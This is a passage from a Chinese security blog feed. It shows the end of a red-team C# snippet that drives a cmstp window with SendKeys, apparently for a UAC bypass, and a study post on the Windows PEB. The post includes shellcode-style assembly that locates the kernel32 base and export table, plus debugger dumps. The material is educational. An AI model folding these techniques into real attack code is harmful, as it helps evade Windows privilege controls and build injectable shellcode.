runcmd.UseShellExecute = false;                Process.Start(runcmd);                IntPtr windowhandle = execute();                //由于刚刚cmstp进程刚刚创建无法快速获取对应的窗口句柄，使用循环来解决                while (windowhandle == IntPtr.Zero) {                    windowhandle = execute();                }                Console.WriteLine(&quot;The Cmstp Handle:&quot; + windowhandle);                SetForegroundWindow(windowhandle); //将CMSTP窗口调出到前台并激活该窗口                SendKeys.SendWait(&quot;{ENTER}&quot;);                }        }       }}</code></pre><p>效果如下<br><img src="https://s3.ax1x.com/2021/03/04/6Zt5kj.gif" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/86685&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/86685&lt;/a&gt;&lt;br&gt;&lt;a</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>PEB的深入学习</title>
    <link href="http://422926799.github.io/posts/165f8274.html"/>
    <id>http://422926799.github.io/posts/165f8274.html</id>
    <published>2021-02-22T06:26:52.000Z</published>
    <updated>2021-02-22T12:04:03.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>纯属是之前乱弄shellcode编写的时候看见的PEB，然后当时做了笔记。不是很熟悉PEB这个，打算在了解一下。</p><h2 id="PEB是什么"><a href="#PEB是什么" class="headerlink" title="PEB是什么"></a>PEB是什么</h2><blockquote><p>进程环境块（PEB）是 Windows NT操作系统内部使用的数据结构，用以存储每个进程的运行时数据。[1] Microsoft的MSDN文档中仅公开了PEB的少数几个域，该结构“在未来的Windows版本中可能会修改”。[2]PEB包含的数据结构适用于整个进程，如全局上下文，启动参数，程序image装载器的数据结构，程序image的基地址，进程级互斥同步访问对象等。[1]<br>PEB与kernel mode EPROCESS数据结构密切相关。也是逐进程数据结构，在客户-服务器运行时子系统(CSRSS)进程地址空间被管理。但是，类似于CSRSS数据结构，PEB自身并不是内核模式数据结构。它驻留在所关联的进程的用户态内存空间中。这是因为它被设计为被操作系统的用户态的程序所使用，如NTDLL，在内核态之外执行，如程序映象的加载器与堆管理器。[3]<br>WinDbg中，卸载PEB内容的命令是!peb，命令参数是PEB在进程地址空间的地址，它实际上是通过!process命令获取，将显示来自于EPROCESS数据结构的信息，其中一个域是PEB地址。[3]</p></blockquote><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>windbg<br>od<br>vs</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>用汇编写一段寻找PEB地址的指令，然后编译逐渐调试。</p><pre><code class="asm">global _startsection .text    _start:        mov eax,[fs:0x30] ;EAX=PEB        mov eax,[eax+0xc] ;EAX=PEB-&gt;Ldr        mov esi,[eax+0x14] ;ESI=PEB-&gt;Ldr.InMemOrder (Ldr.InMemOrder地址赋到ESI寄存器)        lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址        xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)        lodsd ;EAX=Third(Kernel32)        mov ebx,[eax+0x10] ;EBX=Kernel32基地址        mov edx,[ebx+0x3c] ;EDX = DOS-&gt;e_lfanew (DOS头偏移地址)        add edx,ebx ;PE头地址获取        mov edx,[edx+0x78] ;IMAGE_EXPORT_DIRECTORY        add edx,ebx ;EDX = Export table        mov esi, [edx + 0x20]    ; ESI = Offset namestable        add esi, ebx             ; ESI = Names table        xor ecx, ecx             ; EXC = 0</code></pre><p>yasm和golink编译成exe</p><pre><code>yasm.win32.exe -f win32 -o test.obj test.asmGolink /ni /entry _start shell.obj</code></pre><p>然后拖入windbg调，自动解析PEB<code>!peb</code><br><img src="https://s3.ax1x.com/2021/02/22/y7XI41.png" alt=""></p><ul><li>InheritedAddressSpace: 继承的地址空间</li><li>ReadImageFileExecOptions: 读取文件镜像执行选项</li><li>BeingDebugged: 是否在被调试</li><li>ImageBaseAddress: 镜像基本的地址</li><li>Ldr: (到PEB_LDR_DATA结构的指针，提供被加载模块的信息。)包含kernel32 与ntdll的基地址</li><li>SubSystemData: 子系统数据</li><li>ProcessHeap: 进程堆栈首地址</li><li>ProcessParameters: 进程参数地址</li><li>CurrentDirectory: 当前目录</li><li>WindowTitle: 窗口标题</li><li>ImageFile: 镜像我呢见</li><li>CommandLine: 命令行</li><li>DllPath: DLL路径</li><li>Environment: 环境</li></ul><p>手动解析PEB<code>dt _PEB @$peb</code></p><pre><code class="asm">ntdll!_PEB   +0x000 InheritedAddressSpace : 0 &#39;&#39;   +0x001 ReadImageFileExecOptions : 0 &#39;&#39;   +0x002 BeingDebugged    : 0x1 &#39;&#39;   +0x003 BitField         : 0 &#39;&#39;   +0x003 ImageUsesLargePages : 0y0   +0x003 IsProtectedProcess : 0y0   +0x003 IsImageDynamicallyRelocated : 0y0   +0x003 SkipPatchingUser32Forwarders : 0y0   +0x003 IsPackagedProcess : 0y0   +0x003 IsAppContainer   : 0y0   +0x003 IsProtectedProcessLight : 0y0   +0x003 IsLongPathAwareProcess : 0y0   +0x004 Mutant           : 0xffffffff Void   +0x008 ImageBaseAddress : 0x00400000 Void   +0x00c Ldr              : 0x7750dca0 _PEB_LDR_DATA   +0x010 ProcessParameters : 0x004b1d38 _RTL_USER_PROCESS_PARAMETERS   +0x014 SubSystemData    : (null)    +0x018 ProcessHeap      : 0x004b0000 Void   +0x01c FastPebLock      : 0x7750da60 _RTL_CRITICAL_SECTION   +0x020 AtlThunkSListPtr : (null)    +0x024 IFEOKey          : (null)    +0x028 CrossProcessFlags : 3   +0x028 ProcessInJob     : 0y1   +0x028 ProcessInitializing : 0y1   +0x028 ProcessUsingVEH  : 0y0   +0x028 ProcessUsingVCH  : 0y0   +0x028 ProcessUsingFTH  : 0y0   +0x028 ProcessPreviouslyThrottled : 0y0   +0x028 ProcessCurrentlyThrottled : 0y0   +0x028 ProcessImagesHotPatched : 0y0   +0x028 ReservedBits0    : 0y000000000000000000000000 (0)   +0x02c KernelCallbackTable : (null)    +0x02c UserSharedInfoPtr : (null)    +0x030 SystemReserved   : 0   +0x034 AtlThunkSListPtr32 : (null)    +0x038 ApiSetMap        : 0x00040000 Void   +0x03c TlsExpansionCounter : 0   +0x040 TlsBitmap        : 0x7750dc50 Void   +0x044 TlsBitmapBits    : [2] 0x10001   +0x04c ReadOnlySharedMemoryBase : 0x7fe40000 Void   +0x050 SharedData       : (null)    +0x054 ReadOnlyStaticServerData : 0x7fe40750  -&gt; (null)    +0x058 AnsiCodePageData : 0x7ffa0000 Void   +0x05c OemCodePageData  : 0x7ffa0000 Void   +0x060 UnicodeCaseTableData : 0x7ffd0028 Void   +0x064 NumberOfProcessors : 0xc   +0x068 NtGlobalFlag     : 0x70   +0x070 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000   +0x078 HeapSegmentReserve : 0x100000   +0x07c HeapSegmentCommit : 0x2000   +0x080 HeapDeCommitTotalFreeThreshold : 0x10000   +0x084 HeapDeCommitFreeBlockThreshold : 0x1000   +0x088 NumberOfHeaps    : 1   +0x08c MaximumNumberOfHeaps : 0x10   +0x090 ProcessHeaps     : 0x7750c760  -&gt; 0x004b0000 Void   +0x094 GdiSharedHandleTable : (null)    +0x098 ProcessStarterHelper : (null)    +0x09c GdiDCAttributeList : 0   +0x0a0 LoaderLock       : 0x7750b3d0 _RTL_CRITICAL_SECTION   +0x0a4 OSMajorVersion   : 0xa   +0x0a8 OSMinorVersion   : 0   +0x0ac OSBuildNumber    : 0x47bb   +0x0ae OSCSDVersion     : 0   +0x0b0 OSPlatformId     : 2   +0x0b4 ImageSubsystem   : 2   +0x0b8 ImageSubsystemMajorVersion : 4   +0x0bc ImageSubsystemMinorVersion : 0   +0x0c0 ActiveProcessAffinityMask : 0xfff   +0x0c4 GdiHandleBuffer  : [34] 0   +0x14c PostProcessInitRoutine : (null)    +0x150 TlsExpansionBitmap : 0x7750dc38 Void   +0x154 TlsExpansionBitmapBits : [32] 1   +0x1d4 SessionId        : 1   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER 0x0   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0   +0x1e8 pShimData        : 0x001b0000 Void   +0x1ec AppCompatInfo    : (null)    +0x1f0 CSDVersion       : _UNICODE_STRING &quot;&quot;   +0x1f8 ActivationContextData : (null)    +0x1fc ProcessAssemblyStorageMap : (null)    +0x200 SystemDefaultActivationContextData : 0x001a0000 _ACTIVATION_CONTEXT_DATA   +0x204 SystemAssemblyStorageMap : (null)    +0x208 MinimumStackCommit : 0   +0x20c SparePointers    : [4] (null)    +0x21c SpareUlongs      : [5] 0   +0x230 WerRegistrationData : (null)    +0x234 WerShipAssertPtr : (null)    +0x238 pUnused          : (null)    +0x23c pImageHeaderHash : (null)    +0x240 TracingFlags     : 0   +0x240 HeapTracingEnabled : 0y0   +0x240 CritSecTracingEnabled : 0y0   +0x240 LibLoaderTracingEnabled : 0y0   +0x240 SpareTracingBits : 0y00000000000000000000000000000 (0)   +0x248 CsrServerReadOnlySharedMemoryBase : 0x00007df4`2f970000   +0x250 TppWorkerpListLock : 0   +0x254 TppWorkerpList   : _LIST_ENTRY [ 0x276254 - 0x276254 ]   +0x25c WaitOnAddressHashTable : [128] (null)    +0x45c TelemetryCoverageHeader : (null)    +0x460 CloudFileFlags   : 0x60   +0x464 CloudFileDiagFlags : 0   +0x468 PlaceholderCompatibilityMode : 1 &#39;&#39;   +0x469 PlaceholderCompatibilityModeReserved : [7]  &quot;&quot;   +0x470 LeapSecondData   : 0x7ff90000 _LEAP_SECOND_DATA   +0x474 LeapSecondFlags  : 0   +0x474 SixtySecondEnabled : 0y0   +0x474 Reserved         : 0y0000000000000000000000000000000 (0)   +0x478 NtGlobalFlag2    : 0</code></pre><p>这里比较重要的是Ldr,(PEB_LDR_DATA结构的指针，提供被加载模块的信息。)</p><p>Ldr分析<br><img src="https://s3.ax1x.com/2021/02/22/yHnGZj.png" alt=""></p><pre><code class="asm">   +0x000 Length           : 0x30   +0x004 Initialized      : 0x1 &#39;&#39;   +0x008 SsHandle         : (null)    +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x4b3720 - 0x4b3d30 ]  //按加载顺序   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x4b3728 - 0x4b3d38 ] //按内存顺序   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x4b3628 - 0x4b3d40 ] //按初始化顺序   +0x024 EntryInProgress  : (null)    +0x028 ShutdownInProgress : 0 &#39;&#39;   +0x02c ShutdownThreadId : (null) </code></pre><p>InLoadOrderModuleList、InMemoryOrderModuleList、InMemoryOrderModuleList这三个是双向链表<br>(其实三个都一样，顺序不同而已)<br>对应的格式为 LIST_ENTRY</p><pre><code class="asm">0:000&gt; dt _LIST_ENTRYntdll!_LIST_ENTRY   +0x000 Flink            : Ptr32 _LIST_ENTRY   +0x004 Blink            : Ptr32 _LIST_ENTRY</code></pre><p><strong>LDR_DATA_TABLE_ENTRY structure,双向循环链表</strong>吧，从一个方向开始，不停的循环，就回到初始位了，就相当于遍历了一次</p><p>结构如下</p><pre><code class="asm">0:000&gt; dt _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY   +0x008 InMemoryOrderLinks : _LIST_ENTRY   +0x010 InInitializationOrderLinks : _LIST_ENTRY   +0x018 DllBase          : Ptr32 Void   +0x01c EntryPoint       : Ptr32 Void   +0x020 SizeOfImage      : Uint4B   +0x024 FullDllName      : _UNICODE_STRING   +0x02c BaseDllName      : _UNICODE_STRING   +0x034 FlagGroup        : [4] UChar   +0x034 Flags            : Uint4B   +0x034 PackagedBinary   : Pos 0, 1 Bit   +0x034 MarkedForRemoval : Pos 1, 1 Bit   +0x034 ImageDll         : Pos 2, 1 Bit   +0x034 LoadNotificationsSent : Pos 3, 1 Bit   +0x034 TelemetryEntryProcessed : Pos 4, 1 Bit   +0x034 ProcessStaticImport : Pos 5, 1 Bit   +0x034 InLegacyLists    : Pos 6, 1 Bit   +0x034 InIndexes        : Pos 7, 1 Bit   +0x034 ShimDll          : Pos 8, 1 Bit   +0x034 InExceptionTable : Pos 9, 1 Bit   +0x034 ReservedFlags1   : Pos 10, 2 Bits   +0x034 LoadInProgress   : Pos 12, 1 Bit   +0x034 LoadConfigProcessed : Pos 13, 1 Bit   +0x034 EntryProcessed   : Pos 14, 1 Bit   +0x034 ProtectDelayLoad : Pos 15, 1 Bit   +0x034 ReservedFlags3   : Pos 16, 2 Bits   +0x034 DontCallForThreads : Pos 18, 1 Bit   +0x034 ProcessAttachCalled : Pos 19, 1 Bit   +0x034 ProcessAttachFailed : Pos 20, 1 Bit   +0x034 CorDeferredValidate : Pos 21, 1 Bit   +0x034 CorImage         : Pos 22, 1 Bit   +0x034 DontRelocate     : Pos 23, 1 Bit   +0x034 CorILOnly        : Pos 24, 1 Bit   +0x034 ChpeImage        : Pos 25, 1 Bit   +0x034 ReservedFlags5   : Pos 26, 2 Bits   +0x034 Redirected       : Pos 28, 1 Bit   +0x034 ReservedFlags6   : Pos 29, 2 Bits   +0x034 CompatDatabaseProcessed : Pos 31, 1 Bit   +0x038 ObsoleteLoadCount : Uint2B   +0x03a TlsIndex         : Uint2B   +0x03c HashLinks        : _LIST_ENTRY   +0x044 TimeDateStamp    : Uint4B   +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT   +0x04c Lock             : Ptr32 Void   +0x050 DdagNode         : Ptr32 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY   +0x05c LoadContext      : Ptr32 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : Ptr32 Void   +0x064 SwitchBackContext : Ptr32 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : Uint4B   +0x088 LoadTime         : _LARGE_INTEGER   +0x090 BaseNameHashValue : Uint4B   +0x094 LoadReason       : _LDR_DLL_LOAD_REASON   +0x098 ImplicitPathOptions : Uint4B   +0x09c ReferenceCount   : Uint4B   +0x0a0 DependentLoadFlags : Uint4B   +0x0a4 SigningLevel     : UChar</code></pre><p>跟上面的汇编一样找InMemoryOrderModuleList来遍历<code>0x4b3728 - 0x4b3d38</code>这个地址范围里存着对应的内存顺序载入过程</p><pre><code class="asm">0:000&gt; dt 0x4b3728 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3620 - 0x7750dcb4 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x400000 - 0x401000 ]   +0x018 DllBase          : 0x00002000 Void   +0x01c EntryPoint       : 0x00620060 Void   +0x020 SizeOfImage      : 0x4b21fc   +0x024 FullDllName      : _UNICODE_STRING &quot;test.exe&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;P???&quot;   +0x034 Flags            : 0x7750db50   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb50   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x6032501a - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b37e0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b37e0 Void   +0x050 DdagNode         : 0x004b37e0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x19fa64 - 0x0 ]   +0x05c LoadContext      : 0x773f1124 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : (null)    +0x064 SwitchBackContext : 0x004b3d98 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`33df1536   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;</code></pre><p>然后通过不断遍历链表元素里的InLoadOrderLinks，最后找到kernel32.dll</p><pre><code class="asm">0:000&gt; dt 0x4b3728 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3620 - 0x7750dcb4 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x400000 - 0x401000 ]   +0x018 DllBase          : 0x00002000 Void   +0x01c EntryPoint       : 0x00620060 Void   +0x020 SizeOfImage      : 0x4b21fc   +0x024 FullDllName      : _UNICODE_STRING &quot;test.exe&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;P???&quot;   +0x034 Flags            : 0x7750db50   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb50   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x6032501a - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b37e0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b37e0 Void   +0x050 DdagNode         : 0x004b37e0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x19fa64 - 0x0 ]   +0x05c LoadContext      : 0x773f1124 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : (null)    +0x064 SwitchBackContext : 0x004b3d98 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`33df1536   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;0:000&gt; dt 0x4b3620 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3b08 - 0x4b3728 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4b3ed0 - 0x7750dcbc ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x773f0000 - 0x0 ]   +0x018 DllBase          : 0x0019a000 Void   +0x01c EntryPoint       : 0x003c003a Void   +0x020 SizeOfImage      : 0x4b34f8   +0x024 FullDllName      : _UNICODE_STRING &quot;ntdll.dll&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;@???&quot;   +0x034 Flags            : 0x7750db40   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y0   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb40   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x1e699fab - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b36d8 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b36d8 Void   +0x050 DdagNode         : 0x004b36d8 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x05c LoadContext      : (null)    +0x060 ParentDllBase    : 0x004b3f28 Void   +0x064 SwitchBackContext : (null)    +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0xf46857d4   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0x800   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;0:000&gt; dt 0x4b3b08 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3ec8 - 0x4b3620 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4b3d40 - 0x4b3ed0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x75f50000 - 0x75f65f70 ]   +0x018 DllBase          : 0x000e0000 Void   +0x01c EntryPoint       : 0x00420040 Void   +0x020 SizeOfImage      : 0x4b3c08   +0x024 FullDllName      : _UNICODE_STRING &quot;KERNEL32.DLL&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;0???&quot;   +0x034 Flags            : 0x7750db30   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y1   +0x034 InLegacyLists    : 0y0   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb30   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x59b71f87 - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b3bc0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b3bc0 Void   +0x050 DdagNode         : 0x004b3bc0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x05c LoadContext      : 0x773f1194 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : 0x004b3788 Void   +0x064 SwitchBackContext : 0x004b3680 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`536cd652   +0x090 BaseNameHashValue : 0x4000   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;</code></pre><p>对面上面的汇编</p><pre><code class="asm">mov eax,[fs:0x30] ;EAX=PEBmov eax,[eax+0xc] ;EAX=PEB-&gt;Ldrmov esi,[eax+0x14] ;ESI=PEB-&gt;Ldr.InMemOrder (Ldr.InMemOrder地址赋到ESI寄存器)lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)lodsd ;EAX=Third(Kernel32)mov ebx,[eax+0x10] ;EBX=Kernel32基地址</code></pre><p>最后对应的0x10链表首地址放的即为kernel32.dll的基址</p><pre><code> +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x75f50000 - 0x75f65f70 ]</code></pre><p>其实可以简写成别的(lodsd看起来容易把人搞混）</p><pre><code class="asm">mov eax, fs:[0x30]   //得到PEB地址，其实这里还有个TEB的概念，但是只用到这一次，为了防止混乱，就不再解释了mov eax, [eax + 0xc]//指向PEB_LDR_DATA结构的首地址mov eax, [eax + 0x1c]//一个双向链表的地址mov eax, [eax]//得到第二个条目kernelBase的链表mov eax, [eax]//得到第三个条目kernel32链表（win10）mov eax, [eax + 0x8] //kernel32.dll地址</code></pre><p>对应0x8链表里的kernel32.dll基址<br><img src="https://s3.ax1x.com/2021/02/22/yHtCWQ.png" alt=""></p><p><strong>在内存里的过程</strong><br>可以使用OD进行验证，od拖入test.exe。然后在堆栈窗口ctrl+G输入<code>fs:[0]</code>跳到所在位置<br>执行<code>mov eax,fs[0x30]</code>后<br><img src="https://s3.ax1x.com/2021/02/22/yHN04U.png" alt=""></p><p>执行<code>mov eax, [eax + 0xc]</code>得到LDR地址<br>(得到PEB地址后，在内存窗口ctrl+G输入PEB的地址，选择”长型”-&gt;”地址”)<br><img src="https://s3.ax1x.com/2021/02/22/yHD3dA.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/22/yHwYGT.png" alt=""></p><p>执行<code>lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址</code>得到链表里的第一个Flink的地址<br>(数据窗口选择刚刚的InMemoryOrderModuleList地址，选择”数据窗口跟随”)<br><img src="https://s3.ax1x.com/2021/02/22/yHD5w9.png" alt=""></p><p>继续执行</p><pre><code>xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)lodsd 